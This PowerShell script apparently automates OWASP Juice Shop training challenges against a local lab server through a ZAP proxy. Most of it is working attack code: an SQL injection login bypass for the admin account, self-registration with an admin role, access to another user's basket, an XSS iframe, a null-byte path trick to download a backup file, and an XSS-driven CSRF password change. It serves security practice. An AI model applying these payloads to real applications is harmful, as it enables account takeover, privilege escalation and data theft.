#region Funciones

function waitIEReady($ie,$milis){

    while ($ie.busy) {
        sleep -milliseconds $milis
    }

}

#endregion


$urlbase = "http://192.168.2.130:3000"
$zap_proxy = "http://172.25.194.216:8082" 

$user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0"

Clear-Host
ps *iexplore* | kill

$oIE= New-Object -com InternetExplorer.Application
$oIE.Visible=$true

#---------------------------------------------------------------------------------------------------------------------------
# Get Score Board
#---------------------------------------------------------------------------------------------------------------------------
Clear-Host

$response = Invoke-RestMethod "$urlbase/rest/admin/application-version" -Proxy $zap_proxy 
Write-Host ("version: {0}" -f $response.version)

$response = Invoke-RestMethod "$urlbase/rest/admin/application-configuration"  -Proxy $zap_proxy 
$scoreBoard = $response.config.application.securityTxt.acknowledgements

$url = "{0}{1}" -f $urlbase,$scoreBoard
$oIE.Navigate2($url)
waitIEReady -ie $oIE -milis 500

$elem = $oIE.Document.body.getElementsByClassName('mat-card-title')
Write-Host $elem.item(0).innerText


#---------------------------------------------------------------------------------------------------------------------------
# Login Admin user account with SQLi attack
#---------------------------------------------------------------------------------------------------------------------------
$body = "{`"email`":`"' union SELECT * FROM Users;--`",`"password`":`"`"}"
$session = $null
$response = Invoke-RestMethod  "$urlbase/rest/user/login" -SessionVariable session -Method Post -Body $body -ContentType "application/json" -UserAgent $user_agent  -Proxy $zap_proxy 
$mail = $response.authentication.umail
Write-Host ("Email Admin: {0}" -f $mail)
$token = $response.authentication.token
write-host ("Token JWT: {0}" -f $token)


$url = "$urlbase#/administration"
$response = wget $url -WebSession $session

if($response.StatusCode -eq 200){write-host "Lección SQLi attack superada!!!"}

#---------------------------------------------------------------------------------------------------------------------------
# Broken Acess Control
#---------------------------------------------------------------------------------------------------------------------------

$url = "$urlbase/rest/basket/1" 
$session.Headers.Add('Authorization',"Bearer $token")

$response = Invoke-RestMethod $url -WebSession $session -Proxy $zap_proxy 
Write-Host ("Acceso carrito id: {0}" -f $response.data.id)
if($response.data.id -eq 1){write-host "Lección Broken Acess Control superada!!!"}

#---------------------------------------------------------------------------------------------------------------------------
# Broken Authentication
#---------------------------------------------------------------------------------------------------------------------------
$body = '{"email":"EmilioJRoldan4@gmail.com","password":"pass1234","passwordRepeat":"pass1234","securityQuestion":{"id":1,"question":"Your eldest siblings middle name?","createdAt":"2021-06-28T15:44:12.390Z","updatedAt":"2021-06-28T15:44:12.390Z"},"securityAnswer":"antonio","role": "admin"}'
$url = "$urlbase/api/Users/"
$response = Invoke-RestMethod $url -WebSession $session -Method Post -Body $body -Proxy $zap_proxy 

if($response.status -eq "success"){write-host "Lección Broken Authentication superada!!!"}

#---------------------------------------------------------------------------------------------------------------------------
# Cross-Site Scripting (XSS) attack
#---------------------------------------------------------------------------------------------------------------------------
$xxs_atack = '/#/search?q=%3Ciframe%20width%3D%22100%25%22%20height%3D%22166%22%20scrolling%3D%22no%22%20frameborder%3D%22no%22%20allow%3D%22autoplay%22%20src%3D%22https:%2F%2Fw.soundcloud.com%2Fplayer%2F%3Furl%3Dhttps%253A%2F%2Fapi.soundcloud.com%2Ftracks%2F771984076%26color%3D%2523ff5500%26auto_play%3Dtrue%26hide_related%3Dfalse%26show_comments%3Dtrue%26show_user%3Dtrue%26show_reposts%3Dfalse%26show_teaser%3Dtrue%22%3E%3C%2Fiframe%3E'
$url = "{0}{1}" -f $urlbase,$xxs_atack 
$oIE.Navigate2($url)

#Lirics 
$res = wget "https://pwning.owasp-juice.shop/appendix/lyrics.html"
$res.ParsedHtml.body.getElementsByTagName('code').item(0).innerText

#---------------------------------------------------------------------------------------------------------------------------
# Sensitive Data Exposure
#---------------------------------------------------------------------------------------------------------------------------

$url = "$urlbase/robots.txt"
$response = wget $url -Proxy $zap_proxy 
$response.Content

$url = "$urlbase/ftp"
$response = wget $url -Proxy $zap_proxy 
$response.Content
$response.ParsedHtml.links | ft -Property href 

#Exposed Metrics
$url = "$urlbase/metrics" 
$response = wget $url -Proxy $zap_proxy 
$response.Content | select -First 3


$url = "$urlbase/ftp/acquisitions.md"
$response = wget $url -Proxy $zap_proxy 
if([bool]$resultado.lessonCompleted){write-host "Lección Broken Sensitive Data Exposure superada!!!"}


$url = "$urlbase/ftp/package.json.bak%2500.md"
wget $url -OutFile package.json.bak -Proxy $zap_proxy 
write-host "Lección Sensitive Data Exposure superada!!!"


#---------------------------------------------------------------------------------------------------------------------------
# XSS & Cross-Site Request Forgery (CSRF) attack
#---------------------------------------------------------------------------------------------------------------------------
$url = "$PSScriptRoot\Resources\CSRF_FORM.html"

$url = "$urlbase/rest/user/login"
$body = '{"email":"EmilioJRoldan@gmail.com","password":"Sogeti1234"}'
$response = Invoke-RestMethod  "$urlbase/rest/user/login" -SessionVariable session -Method Post -Body $body -ContentType "application/json" -UserAgent $user_agent  -Proxy $zap_proxy 
$token= $response.authentication.token

$session.Headers.Add('Authorization',"Bearer $token")

$url = "$urlbase/#/search?q=%3Cscript%3Exmlhttp%20%3D%20new%20XMLHttpRequest;%20xmlhttp.open('GET',%20'{0}%2Frest%2Fuser%2Fchange-password%3Fnew%3DslurmCl4ssic%26repeat%3DslurmCl4ssic');%20xmlhttp.send()%3C%2Fscript%3E" -f [System.Web.HttpUtility]::UrlEncode($urlbase)
$response = wget $url -Proxy $zap_proxy -WebSession $session

$response = Invoke-RestMethod  "$urlbase/rest/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic" -WebSession $session -ContentType "application/json" -UserAgent $user_agent  -Proxy $zap_proxy
$response.user.email 
if($response.user.email -ne [String]::Empty){write-host "Lección Cross-Site Request Forgery (CSRF) attacksuperada!!!"}
$response = Invoke-RestMethod  "$urlbase/rest/user/change-password?new=Sogeti1234&repeat=Sogeti1234" -WebSession $session -ContentType "application/json" -UserAgent $user_agent  -Proxy $zap_proxy



#---------------------------------------------------------------------------------------------------------------------------
# Xml External Entities (XXE)
#---------------------------------------------------------------------------------------------------------------------------




